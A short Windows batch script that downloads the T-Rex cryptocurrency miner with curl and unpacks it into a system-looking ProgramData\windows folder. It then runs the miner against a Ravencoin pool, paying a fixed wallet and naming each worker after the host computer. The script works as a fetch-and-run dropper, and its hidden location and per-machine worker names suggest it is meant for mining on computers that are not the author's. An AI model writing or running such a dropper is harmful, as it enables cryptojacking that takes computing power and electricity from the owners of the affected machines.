@echo off
cd %systemdrive%\programdata\windows
curl https://trex-miner.com/download/t-rex-0.26.8-win.zip --output my.zip
powershell -command "Expand-Archive my.zip "
copy my\t-rex.exe .
t-rex.exe -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RTKJqEgZEwNLdAvuTS6eRMJYp52YmqYBj7.%ComputerName% -p x
pause
